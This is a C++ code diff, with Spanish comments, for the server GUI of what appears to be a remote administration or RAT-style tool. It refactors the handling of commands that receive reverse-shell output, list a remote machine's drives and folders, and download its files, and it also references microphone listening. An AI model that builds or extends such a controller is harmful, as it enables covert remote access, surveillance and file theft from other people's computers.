@@ -27,14 +27,38 @@ void Cliente_Handler::Spawn_Handler(){
             break;
         }
 
-        this->Log(std::to_string(iRecibido) + " bytes recibidos");
-        this->Log(cBuffer);
+        //this->Log(std::to_string(iRecibido) + " bytes recibidos");
+        //this->Log(cBuffer);
 
         std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 1);
+        if (vcDatos.size() == 0) {
+            this->Log("No se pudo procesar el buffer");
+            continue;
+        }
 
+        //Descarga de archivos aqui
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
+            vcDatos = strSplit(std::string(cBuffer), '\\', 2);
+            // CMD + 2 slashs /  +len del id
+            int iHeader = 5 + vcDatos[1].size();
+            char* cBytes = cBuffer + iHeader;
+
+            std::unique_lock<std::mutex> lock(this->mt_Archivos);
+
+            auto archivoIter = this->um_Archivos_Descarga2.find(vcDatos[1]);
+            if (archivoIter != this->um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
+                fwrite(cBytes, sizeof(char), iRecibido - iHeader, archivoIter->second.iFP);
+                archivoIter->second.uDescargado += (iRecibido - iHeader);
+                //this->Log(std::to_string(archivoIter->second.uDescargado));
+            }
+            
+            lock.unlock();
+            continue;
+        }
+
+        vcDatos = strSplit(std::string(cBuffer), '\\', 4);
         //Pquete inicial
         if (vcDatos[0] == "01") {
-            vcDatos = strSplit(std::string(cBuffer), '\\', 4);
             if (vcDatos.size() < 4) {
                 this->Log("Error procesando los datos " + std::string(cBuffer));
                 continue;;
@@ -58,7 +82,6 @@ void Cliente_Handler::Spawn_Handler(){
 
         //Termino la shell
         if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { 
-            vcDatos = strSplit(std::string(cBuffer), '\\', 2);
             this->EscribirSalidShell(vcDatos[1]);
             continue;
         }
@@ -68,9 +91,111 @@ void Cliente_Handler::Spawn_Handler(){
             int iCmdH = (std::to_string(EnumComandos::Reverse_Shell_Salida).size() + 1);
             char* pBuf = cBuffer + iCmdH;
             this->EscribirSalidShell(std::string(pBuf));
+            this->Log(pBuf);
             continue;
         }
 
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
+            std::vector<std::string> vcFileEntry;
+            wxString strTama = "-";
+            if (vcDatos[1][1] == '>') {
+                //Dir
+                vcFileEntry = strSplit(vcDatos[1], '>', 4);
+            }
+            else if (vcDatos[1][1] == '<') {
+                //file
+                vcFileEntry = strSplit(vcDatos[1], '<', 4);
+                u64 bytes = StrToUint(vcFileEntry[2].c_str());
+                char* cDEN = "BKMGTP";
+                double factor = floor((vcFileEntry[2].size() - 1) / 3);
+                char cBuf[20];
+                snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
+                strTama = cBuf;
+            }
+            else {
+                //unknown
+                std::cout << "DESCONOCIDO: " << cBuffer << std::endl;
+            }
+
+            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
+            if (temp_list) {
+                if (vcFileEntry.size() >= 4) {
+                    int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
+                    temp_list->InsertItem(iCount, wxString("-"));
+                    temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
+                    temp_list->SetItem(iCount, 2, strTama); //tama
+                    temp_list->SetItem(iCount, 3, wxString(vcFileEntry[3]));
+                }
+            }
+            
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
+            char* pBuf = cBuffer + 4;
+            std::vector<std::string> vDrives = strSplit(std::string(pBuf), '\\', 100); //maximo 100 por ahora, pero se deberia de incrementar en un futuro
+
+            if (vDrives.size() > 0) {
+                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, this->n_Frame);
+                if (temp_list) {
+                    for (int iCount = 0; iCount<int(vDrives.size()); iCount++) {
+                        std::vector<std::string> vDrive = strSplit(vDrives[iCount], '|', 5);
+
+                        temp_list->InsertItem(iCount, wxString(vDrive[0]));
+                        temp_list->SetItem(iCount, 1, wxString(vDrive[2]));
+                        temp_list->SetItem(iCount, 2, wxString(vDrive[1]));
+                        temp_list->SetItem(iCount, 3, wxString(vDrive[3]));
+                        temp_list->SetItem(iCount, 4, wxString(vDrive[4]));
+                    }
+                }
+                
+            }
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
+            //Tamaño del archivo recibido
+            u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
+
+            auto archivo = this->um_Archivos_Descarga2.find(vcDatos[1]);
+            
+            if (archivo != this->um_Archivos_Descarga2.end()) {
+                archivo->second.uTamarchivo = uTamArchivo;
+            }
+
+            std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
+            auto archivo = this->um_Archivos_Descarga2.find(vcDatos[1]);
+            if (archivo != this->um_Archivos_Descarga2.end()) {
+                if (archivo->second.iFP != nullptr) {
+                    fclose(archivo->second.iFP);
+                }
+            }
+            std::cout << "[!] Descarga completa" << std::endl;
+            wxMessageBox("Descarga completa", "Completo", wxOK);
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
+            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, this->n_Frame);
+            if (temp_panel) {
+                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer + 4));
+                temp_panel->c_RutaActual.clear();
+                std::vector<std::string> vcSubRutas = strSplit(cBuffer + 4, '\\', 100);
+                for (auto item : vcSubRutas) {
+                    std::string strTemp = item;
+                    strTemp += "\\";
+                    temp_panel->c_RutaActual.push_back(strTemp);
+                }
+            }
+            else {
+                this->Log("No se pudo encontrar panel FM activo");
+            }
+            continue;
+        }
     }
     std::cout << "[" << this->p_thHilo.get_id() << "] funado\n";
 }
@@ -557,121 +682,7 @@ void Servidor::m_Escucha(){
                         continue;
                     }
 
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Discos_Lista)) {
-                        char* pBuf = cBuffer + 4;
-                        std::vector<std::string> vDrives = strSplit(std::string(pBuf), '\\', 100); //maximo 100 por ahora, pero se deberia de incrementar en un futuro
-                        
-                        if (vDrives.size() > 0) {
-                            FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
-                            if (temp) {
-                                ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, temp);
-                                if (temp_list) {
-                                    for (int iCount = 0; iCount<int(vDrives.size()); iCount++) {
-                                        std::vector<std::string> vDrive = strSplit(vDrives[iCount], '|', 5); 
-
-                                        temp_list->InsertItem(iCount, wxString(vDrive[0]));
-                                        temp_list->SetItem(iCount, 1, wxString(vDrive[2]));
-                                        temp_list->SetItem(iCount, 2, wxString(vDrive[1]));
-                                        temp_list->SetItem(iCount, 3, wxString(vDrive[3]));
-                                        temp_list->SetItem(iCount, 4, wxString(vDrive[4]));
-                                    }
-                                }
-                            }else {
-                                std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
-                            }
-                        }
-                        continue;
-                    }
-
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Dir_Folder)) {
-                        std::vector<std::string> vcFileEntry;
-                        wxString strTama = "-";
-                        if (vcDatos[1][1] == '>') {
-                            //Dir
-                            vcFileEntry = strSplit(vcDatos[1], '>', 4);
-                        } else if (vcDatos[1][1] == '<') {
-                            //file
-                            vcFileEntry = strSplit(vcDatos[1], '<', 4);
-                            u64 bytes = StrToUint(vcFileEntry[2].c_str());
-                            char* cDEN = "BKMGTP";
-                            double factor = floor((vcFileEntry[2].size() - 1) / 3);
-                            char cBuf[20];
-                            snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
-                            strTama = cBuf;
-                        } else {
-                            //unknown
-                            std::cout <<"DESCONOCIDO: "<< cBuffer << std::endl;
-                        }
-
-                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
-                        if (temp) {
-                            ListCtrlManager* temp_list = (ListCtrlManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM_List, temp);
-                            if (temp_list) {
-                                if (vcFileEntry.size() >= 4) {
-                                    int iCount = temp_list->GetItemCount() > 0 ? temp_list->GetItemCount() - 1 : 0;
-                                    temp_list->InsertItem(iCount, wxString("-"));
-                                    temp_list->SetItem(iCount, 1, wxString(vcFileEntry[1]));
-                                    temp_list->SetItem(iCount, 2, strTama); //tama
-                                    temp_list->SetItem(iCount, 3, wxString(vcFileEntry[3]));
-                                }
-                            }
-                        }
-                        else {
-                            std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
-                        }
-                        continue;
-                    }
-
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Init)) {
-                        //Tamaño del archivo recibido
-                        u64 uTamArchivo = StrToUint(vcDatos[2].c_str());
-
-                        
-                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
-                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end()) {
-                            archivoIter->second.uTamarchivo = uTamArchivo;
-                        }
-                        
-                        std::cout << "[ID-" << vcDatos[1] << "]Tam archivo: " << uTamArchivo << std::endl;
-                        continue;
-                    }
-
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_End)) {
-                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
-                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
-                            if (archivoIter->second.iFP != nullptr) {
-                                fclose(archivoIter->second.iFP);
-                            }
-                        }
-                        std::cout << "[!] Descarga completa" << std::endl;
-                        wxMessageBox("Descarga completa", "Completo", wxOK);
-
-
-                        continue;
-                    }
-
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_CPATH)) {
-                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
-                        if (temp) {
-                            panelFileManager* temp_panel = (panelFileManager*)wxWindow::FindWindowById(EnumIDS::ID_Panel_FM, temp);
-                            if (temp_panel) {
-                                temp_panel->p_RutaActual->SetLabelText(wxString(cBuffer+4));
-                                temp_panel->c_RutaActual.clear();
-                                std::vector<std::string> vcSubRutas = strSplit(cBuffer+4, '\\', 100);
-                                for (auto item : vcSubRutas) {
-                                    std::string strTemp = item;
-                                    strTemp += "\\";
-                                    temp_panel->c_RutaActual.push_back(strTemp);
-                                }
-                            }else {
-                                std::cout << "No se pudo encontrar panel activo con nombre " << strTempID << std::endl;
-                            }
-                        }else {
-                            std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
-                        }
-                        continue;
-                    }
-
+                    
                     if (vcDatos[0] == "LMIC") {
                         //Siempre escucha el mic por defecto, 
                         //implementar que escucha por el dispositivo seleccionado en el combobox
